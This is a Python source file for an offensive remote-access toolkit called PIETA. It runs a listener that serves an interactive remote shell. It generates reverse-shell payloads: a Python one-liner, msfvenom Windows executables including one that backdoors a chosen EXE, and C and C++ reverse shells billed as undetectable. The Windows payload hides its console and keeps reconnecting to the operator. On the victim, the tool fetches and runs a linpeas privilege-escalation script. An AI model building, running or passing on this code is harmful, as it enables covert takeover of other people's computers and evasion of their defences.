#!/usr/bin/env python3
import readline
import os, time, subprocess, requests, socket, string
from prompt_toolkit.shortcuts import prompt
from prompt_toolkit.styles import Style
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from terminaltables import *
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit import prompt
from sys import *
'''
WORK IN PROGRESS
WORK IN PROGRESS
WORK IN PROGRESS
WORK IN PROGRESS
WORK IN PROGRESS
'''
class colors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKCYAN = '\033[96m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	END = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
def list():
	table_data = [
	['Command', 'Description', 'Usage'],
	['help', 'Displays this help menu', 'help'],
	['listen', 'Starts a listener', 'listen'],
	['generate', 'Generates a payload', 'generate'],
	['exit', 'Exits the application', 'exit'],
	]
	table = SingleTable(table_data)
	print(colors.OKGREEN+colors.BOLD+table.table+colors.END)
def console_list():
	console_data = [
	['Command', 'Description'],
	['linpeas', 'Automatically run linpeas and saves it to linlog.txt'],
	['download', 'Downloads a file from remote machine'],
	['upload', 'Uploads a local file on to a remote machine'],
	]
	tooble = SingleTable(console_data)
	print(colors.FAIL+colors.BOLD+tooble.table+colors.END)
def banner():
	print(colors.OKCYAN+"""

            ███            █████             
           ▒▒▒            ▒▒███              
 ████████  ████   ██████  ███████    ██████  
▒▒███▒▒███▒▒███  ███▒▒███▒▒▒███▒    ▒▒▒▒▒███ 
 ▒███ ▒███ ▒███ ▒███████   ▒███      ███████ 
 ▒███ ▒███ ▒███ ▒███▒▒▒    ▒███ ███ ███▒▒███ 
 ▒███████  █████▒▒██████   ▒▒█████ ▒▒████████
 ▒███▒▒▒  ▒▒▒▒▒  ▒▒▒▒▒▒     ▒▒▒▒▒   ▒▒▒▒▒▒▒▒ 
 ▒███                                        
 █████         ..~..                             
▒▒▒▒▒   ..~:+:++++=====++:~            
       ~~::++++++=======o==oo+:         
     ~:::++++++==+=======o==oooo~       
   ~::::+++++=+=+++++=====ooooooo+      
  ~::::++++++=+=====+=======oooooo:     
 ~:::::::+++++=++====++=+====oooooo~    
.:::::::+++++++=+==o==+++=+++=o===o+    
~::::::::+++=++=========:::+=+++=oo+    
:~::::::::++++++=====o=~~:+=o+==+====~  
~:~:~::~::+++=+=++====+~:+======++ooo~  
 ~~~~:::::++++===+++=+:+==o=oooooooo+   
  ::::~::++++=~..~::..~~~:+=====ooo=~   
   ~~~~~~:++=o:...:o:~~::+~:::+=ooo=o=  
     ..~~~~:+==~   +o=====~~+++=ooo=o=. 
            .~~     +====+..~++++++++=+ 
                    ~++===:~~+:::~::++. 
                    ~=+====o=o===o++o:  
                      ::++++==ooooooo~  
                           .~:+==ooooo   
        Author: Manjoos

		"""+ colors.END)
	time.sleep(.5)
def recv_timeout(the_socket, timeout=1):
    """ Socket read method """
    the_socket.setblocking(0)
    total_data = []
    data = ''
    begin = time.time()
    while True:
        # if you got some data, then break after wait sec
        if total_data and time.time() - begin > timeout:
            break
        # if you got no data at all, wait a little longer
        elif time.time() - begin > timeout * 1:
            break
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data.decode('utf-8'))
                begin = time.time()
            else:
                time.sleep(0.1)
        except socket.error as e:
            if not e.errno == 11:
                raise
    return ''.join(total_data)
def server(host, port):
    """ Server Method """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(10)
    conn, addr = s.accept()
    print('Connected by', addr)
    return conn
def console(conn):
    while True:
        send_data = input(colors.FAIL+"[CLIENT]~❯ "+colors.END)
        # check for exit
        if send_data == 'exit' or send_data == 'quit':
        	break
        elif send_data == "help" or send_data == "?":
        	console_list()
        elif send_data == "linpeas":
        	print("Running Linpeas...")
        	conn.sendall('{}\n'.format("curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh > linlog.txt &").encode('utf-8'))
        elif send_data:
            conn.sendall('{}\n'.format(send_data).encode('utf-8'))
        else:
            continue
        print(recv_timeout(conn))
    conn.close()
def execute(conn, send_data):
    if send_data.strip():
        conn.sendall('{}\n'.format(send_data).encode('utf-8'))
        # get response from client
        print(recv_timeout(conn))

    conn.close()
def listen():
	host = ''
	port = 9999
	print("Listening on 0.0.0.0 port 9999")
	try:
	    client = server(host, port)
	    console(client)
	except KeyboardInterrupt:
	    sys.exit('\nUser cancelled')
def generate():
	print(colors.OKGREEN+colors.BOLD+"""
[1] Python Reverse Shell
[2] Simple Windows EXE
[3] Windows EXE embedded backdoor
[4] FUD Custom Linux ELF
[5] FUD Custom Windows EXE
		"""+colors.END)
	e = input("Enter: ")
	ask = input("Enter your IP address: ")
	p = 9999
	if e == "1":
		print("""
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
""" % (ask))

	elif e == "2":
		os.system("msfvenom -p windows/shell_reverse_tcp lhost=%s lport=%s -f exe -e x86/shikata_ga_nai -i 15 -o hackerfile.exe" % (ask, p))
	elif e == "3":
		ook = input("Enter the name or path to the EXE file you want to backdoor: ")
		os.system("msfvenom -a x86 --platform windows -x %s -k -p windows/shell_reverse_tcp lhost=%s lport=9999 -e x86/shikata_ga_nai -i 15 -b '\x00' -f exe -o hackerfile.exe" % (ook, ask))
	elif e == "4":
		with open("payload.c", "a") as f:
			f.write("""
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
int main()
{
	int host_sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in host_addr;
	host_addr.sin_family = AF_INET;
	host_addr.sin_port = htons(9999);
	host_addr.sin_addr.s_addr = inet_addr("%s");
	connect(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
	int i;
	for(i=0; i<=2; i++) 
		dup2(host_sock, i);
	execve("/bin/sh", NULL, NULL);
}
				""" % (ask))
		os.system("gcc payload.c -o hackerfile")
		time.sleep(.5)
		print(colors.HEADER+"Success!, payload: hackerfile created!"+colors.END)
	elif e == "5":
		with open("jotaro.cpp", "a") as w:
			w.write("""
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
void RunShell(char* C2Server, int C2Port) {
    while(true) {
        Sleep(5000);
        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);
                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit") == 0) {
                    exit(0);
                }
            }
        }
    }
}
int main(int argc, char **argv) {
    FreeConsole();
    if (argc == 3) {
        int port  = atoi(argv[2]); 
        RunShell(argv[1], port);
    }
    else {
        char host[] = "%s";
        int port = 9999;
        RunShell(host, port);
    }
    return 0;
}

""" % (ask))
		w.close()
		os.system("i686-w64-mingw32-g++ jotaro.cpp -o hackerfile.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
		os.remove("jotaro.cpp")
		print("Hackerfile.exe has been created!")
def prompt():
	banner()
	while True:
		try:
			cmd = input(colors.WARNING + colors.BOLD + "[+] PIETA [+] ❯ " + colors.END)
			if cmd == "?":
				list()
			elif cmd == "help":
				list()
			elif cmd == "exit":
				print("Thanks for your time :)")
				break
			elif cmd == "generate":
				generate()
			elif cmd == "listen":
				listen()
			else:
				print("Invalid command, type ? or help")
		except KeyboardInterrupt:
			print("\nType exit to exit")

def main():
	prompt()
if __name__ == "__main__":
	main()
